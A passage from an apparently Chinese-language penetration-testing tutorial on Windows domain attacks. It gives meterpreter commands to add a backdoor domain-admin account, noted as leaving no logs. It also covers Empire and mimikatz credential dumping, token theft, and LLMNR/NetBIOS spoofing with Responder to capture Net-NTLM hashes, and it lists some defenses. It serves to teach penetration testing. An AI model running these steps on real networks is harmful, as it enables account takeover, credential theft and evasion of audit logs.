执行如下命令，查看域管理员组。可以看到，域管理员已经添加成功了：

```
net group "domain admins" /domain
```

![8e56e071c6bd0eaf06c44a7ff6e60d51.png](image/8e56e071c6bd0eaf06c44a7ff6e60d51.png)

 

同样，我们也可以使用另一种方式，在我们进行**进程迁移到域管上后**，我们可以直接在meterpreter shell上执行添加域管理员的操作，因为meterpreter它是在内存上进行访问的，因此这种方式不会留下日志痕迹，这种方式更优

在活动的meterpreter会话中执行如下命令，在域控主机上添加一个用户

```
add_user shuteer xy@china110 -h 域控的IP地址
```

执行如下命令，将该账户加到域管理员组中

```
add_group_user "Domain Admins" shuteer -h 域控的IP地址
```

![4e94d61a5b08968920fdeb5ca2227a37.png](image/4e94d61a5b08968920fdeb5ca2227a37.png)

![956f8ba81e6427b8c9acafd0e554cc6f.png](image/956f8ba81e6427b8c9acafd0e554cc6f.png)

**Empire下的令牌窃取分析**

我们使用Empire工具时，可以直接使用mimikatz工具获取系统密码。输入"creds"命令，可以看到我们抓取了域内两个用户的明文密码和对应的hash值

![4e499e927d4e1d978968a25348d20795.png](image/4e499e927d4e1d978968a25348d20795.png)

这里的CredID就是对应的ID值，我们使用"pth \<ID\>"命令就能窃取到Administrator的身份令牌了

![0d653ed6bb8b6e168977b6fdafce91cb.png](image/0d653ed6bb8b6e168977b6fdafce91cb.png)

我们可以查看到对应的PID值

![de1f4ada9bd156f869de65a134abcd44.png](image/de1f4ada9bd156f869de65a134abcd44.png)

进程的相关信息，依然可以通过steal\_token获取这个令牌

![2d946c32d910c6b5303484bb17a8ee3a.png](image/2d946c32d910c6b5303484bb17a8ee3a.png)

获得令牌后，输入"revtoself"，恢复令牌的权限

![39e9b3e27669f91231902fe36fe0b4c6.png](image/39e9b3e27669f91231902fe36fe0b4c6.png)

**针对令牌窃取提权的防御措施**

i, 及时安装微软推送的补丁

ii, 对来路不明的或者有危险的软件，既不要在系统中使用，**也不要在虚拟机中使用**

iii, 对令牌的**时效性进行限制**，以防止散列值被破解后泄露有效的令牌信息。越敏感的数据，其令牌时效应该越短。如果每个操作都使用独立的令牌，就可以比较容易定位泄露令牌的操作或环节

iv, 对于令牌，应采取加密存储及多重验证保护

v, 使用加密链路SSL/TLS传输令牌，以防止中间人窃听

**无凭证条件下的权限获取分析及防范**

假设已经进入目标网络，但没有获得任何凭证，使用LLMNR和NetBIOS欺骗攻击对目标网络进行渗透测试。

**LLMNR和NetBIOS欺骗攻击的基本概念**

- LLMNR

LLMNR是指**本地链路多播名称解析**，它是一种域名系统数据包格式。**当局域网中的DNS服务器不可用时，DNS客户端会使用LLMNR解析本地网段中机器的名称**，直到DNS服务器恢复正常为止。LLMNR还支持IPv6协议。

LLMNR的工作过程如下：

i, DNS客户端在自己的内部名称缓存中查询名称

ii, 如果没有找到，主机将向主DNS发送名称查询请求

iii, 如果主DNS没有回应或者收到了错误的信息，主机会向备DNS发送查询请求

iv, 如果备DNS没有回应或者收到了错误的信息，将使用LLMNR进行解析

v, 主机通过UDP协议向组播地址224.0.0.252的5355端口发送多播查询请求，以获取主机名所对应的IP地址。查询范围**仅限于本地子网**。

vi, 本地子网中所有支持LLMNR的主机在收到查询请求后，会对比自己的主机名。如果不同，就丢弃；如果相同，就向查询主机发送包含自己IP地址的单播信息。

- NetBIOS

NetBIOS是一种网络协议，一般用在十几台计算机组成的局域网中，可以根据NetBIOS协议广播获得计算机名称，并将其解析为相应的IP地址。在Windows NT以后版本的所有操作系统中均可使用NetBIOS，但是它不支持IPv6协议。

NetBIOS提供三种服务：

i, NetBIOS\-NS\(名称服务\)：主要用于名称注册和解析，以启动会话和分发数据包。该服务需要使用域名服务器来注册NetBIOS的名称。默认监听UDP的137端口，也可以使用TCP的137端口。

ii, Datagram Distibution Service\(数据分发服务\)：无连接服务。该服务负责进行错误检测和恢复，默认监听UDP的138端口。

iii, Session Service\(会话服务\)：允许两台计算机建立连接，允许电子邮件跨越多个数据包进行传输，提供错误与检测和恢复机制。默认使用TCP的139端口。

- Net\-NTLM Hash

首先先阐述一下Net\-NTLM Hash和NTLM Hash是不一样的。NTLM Hash是指Windows操作系统的Security Account Manager中保存的用户密码散列值。NTLM Hash通常保存在Windows的SAM文件或者NTDS.DIT数据库中，用于对访问资源的用户进行身份认证。**Net\-NTLM Hash是指在网络环境中经过NTLM认证的散列值**。挑战/响应验证中的"响应"就包含Net\-NTLM Hash。**使用Responder抓取通常就是Net\-NTLM Hash。攻击者无法使用该散列值进行哈希传递攻击，只能在使用Hashcat等工具得到明文后进行横向移动攻击**。

**LLMNR和NetBIOS欺骗攻击分析**

如果网络目标的DNS服务器因发生故障而无法提供服务时，会退回LLMNR和NBT\-NS进行计算机名解析。下面使用Responder工具进行渗透测试。

下载：

```
git clone https://github.com/SpiderLabs/Responder.git
```

Responder工具是监听LLMNR和NBT\-NS协议的工具之一，能够抓取网络中所有LLMNR和NBT\-NS请求并响应，获取最初的账户凭证。Responder使用内置SMB认证服务器、MSSQL认证服务器、HTTP认证服务器、HTTPS认证服务器、LDAP认证服务器、DNS认证服务器、WPAD认证服务器，以及FTP、POP3、IMAP、SMTP等服务器，收集目标网络中计算机的凭据，还可以通过Multi\-Relay功能在目标系统上执行命令。

- 监听模式

进入目标后，如果我们没有获得任何重要的凭证和系统的相关消息，那么我们可以使用Responder的**监听模式**。**它只会对网络中的流量进行分析**，并不会主动去响应这些流量包。Responder的ON代表开启该服务的监听，OFF代表关闭了该服务的监听。

![2e98a52a3fa9379bddb66ce647d2abbb.png](image/2e98a52a3fa9379bddb66ce647d2abbb.png)

- 渗透测试

在使用Responder对网络进行分析之后，可以利用SMB协议获取目标网络中计算机的Net\-NTLM Hash。如果用户输入了错误的计算机名，在DNS服务器上进行的名称查询操作将会失败，名称解析请求将被退回，使用NBT\-NS和LLMNR进行解析。

**在渗透测试中，如果使用Responder主动响应请求，它会自动回应客户端的请求并声明自己就是被输入了错误计算机名的那台机器，然后尝试建立SMB连接。紧接着客户端会发送自己的Net\-NTLM Hash进行身份验证，此时将得到目标主机的Net\-NTLM Hash。**
